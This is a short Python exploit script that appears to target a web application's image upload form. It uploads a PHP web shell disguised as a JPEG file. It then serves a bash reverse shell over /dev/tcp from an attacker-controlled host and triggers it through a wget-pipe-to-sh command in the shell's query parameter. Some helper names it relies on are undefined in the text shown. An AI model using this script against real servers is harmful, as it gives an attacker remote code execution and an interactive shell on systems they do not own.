import requests
import time

requests.packages.urllib3.disable_warnings()

session = requests.Session()
session.verify = False


# Uploading webshell.php.jpg
payload_data = b'\xff\xd8\xff\xdb' + b'<?=`$_GET[0]`;?>'

files = {
    'image': ('webshell.php.jpg', payload_data, 'image/jpeg'),
    'submit': (None, 'Upload Image'),
}

# RCE to reverse shell
shell_payload = f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'" 
SERVED_FILES["/shell.sh"] = (shell_payload, "text/x-shellscript")
httpd = start_server(host=lhost, port=80)
time.sleep(2)
wget_cmd = f"wget -O - http://{lhost}/shell.sh | sh"
r3 = session.get(f"{base_url}/images/uploads/{filename}.php.jpg?0={wget_cmd}")
assert r3.status_code == 200, print("RCE not working.")